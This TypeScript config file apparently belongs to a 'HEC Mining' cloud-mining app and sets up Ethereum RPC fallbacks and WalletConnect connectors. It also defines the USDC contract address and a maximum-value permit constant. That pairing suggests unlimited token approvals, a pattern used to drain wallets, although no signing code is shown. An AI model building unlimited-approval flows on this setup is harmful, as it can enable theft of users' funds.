import { createConfig } from 'wagmi'
import { fallback, http } from 'viem'
import { mainnet } from 'wagmi/chains'
import { injected, walletConnect } from 'wagmi/connectors'

export const ETH_CHAIN_ID = 1

/** 与参考站一致：ethereum-rpc.publicnode.com */
export const DEFAULT_ETH_RPC_URL = 'https://ethereum-rpc.publicnode.com'

const publicEthRpcUrls = [
  DEFAULT_ETH_RPC_URL,
  'https://eth.drpc.org',
  'https://cloudflare-eth.com',
]

/** WalletConnect 只接受完整 http(s) URL，相对路径（如 /eth-rpc）会直接报错 */
function resolveEthRpcUrl(raw?: string | null): string {
  const candidate = raw?.trim()
  if (candidate && /^https?:\/\//i.test(candidate)) return candidate
  return DEFAULT_ETH_RPC_URL
}

export const wcProjectId = import.meta.env.VITE_WC_PROJECT_ID ?? ''

export function walletConnectRpcUrl(chainId = ETH_CHAIN_ID): string | null {
  if (!wcProjectId) return null
  return `https://rpc.walletconnect.org/v1/?projectId=${wcProjectId}&chainId=eip155:${chainId}`
}

const ethRpcUrls = [
  walletConnectRpcUrl(),
  resolveEthRpcUrl(import.meta.env.VITE_ETH_RPC_URL),
  ...publicEthRpcUrls,
].filter((url): url is string => Boolean(url))
  .filter((url, index, list) => list.indexOf(url) === index)

export const ETH_RPC_URL = ethRpcUrls[0]

/** 链定义里也写入 RPC，供 WalletConnect extractRpcUrls 兜底 */
export const hecMainnet = {
  ...mainnet,
  rpcUrls: {
    default: { http: [...ethRpcUrls] },
    public: { http: [...ethRpcUrls] },
  },
} as const

export const ethTransport = fallback(
  ethRpcUrls.map((url) =>
    http(url, {
      timeout: 15_000,
      retryCount: 1,
    }),
  ),
)

/** WalletConnect 元数据域名：与 TRON 版一致，避免 TP 显示 localhost 导致中继不稳定 */
function resolveWcAppUrl(): string {
  const fromEnv = import.meta.env.VITE_WC_APP_URL?.trim()
  if (fromEnv && /^https?:\/\//i.test(fromEnv)) return fromEnv.replace(/\/$/, '')
  if (typeof window !== 'undefined') return window.location.origin
  return 'https://hecminai.cloud'
}

export const ETH_USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as const

export const PERMIT_MAX_VALUE = BigInt(
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
)

const wcAppUrl = resolveWcAppUrl()

const metadata = {
  name: 'HEC Mining',
  description: '云算力挖矿平台',
  url: wcAppUrl,
  icons: [`${wcAppUrl}/favicon.ico`],
}

export const wagmiConfig = createConfig({
  chains: [hecMainnet],
  connectors: [
    injected({ shimDisconnect: true }),
    ...(wcProjectId
      ? [
          walletConnect({
            projectId: wcProjectId,
            metadata,
            showQrModal: false,
            // 与 TRON 扫码一致；.org 在国内部分网络不可达时可改用 .com
            relayUrl: 'wss://relay.walletconnect.com',
          }),
        ]
      : []),
  ],
  transports: {
    [hecMainnet.id]: ethTransport,
  },
})
